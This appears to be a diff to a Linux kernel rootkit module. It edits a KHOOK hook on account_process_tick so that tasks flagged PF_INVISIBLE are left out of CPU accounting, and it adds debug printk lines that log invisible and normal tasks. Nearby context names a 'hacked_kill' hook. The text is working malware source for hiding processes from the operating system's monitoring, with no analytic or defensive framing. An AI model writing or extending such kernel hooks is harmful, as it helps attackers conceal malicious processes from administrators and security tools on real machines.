@@ -218,12 +218,13 @@ hacked_kill(const struct pt_regs* pt_regs) {
 }
 
 KHOOK(account_process_tick);
-
-static void khook_account_process_tick(struct task_struct* tsk, int user) {
-	if (tsk->flags & PF_INVISIBLE) {
+static void khook_account_process_tick(struct task_struct* task, int user) {
+	if (task->flags & PF_INVISIBLE) {
+		printk(KERN_INFO "Invisible task detected in account_process_tick! Task: %s (pid=%d)\n", task->comm, task->pid);
 		return;
 	}
-	return KHOOK_ORIGIN(account_process_tick, tsk, user);
+	printk(KERN_INFO "Normal task detected in account_process_tick! Task: %s (pid=%d)\n", task->comm, task->pid);
+	return KHOOK_ORIGIN(account_process_tick, task, user);
 }
 
 static inline void
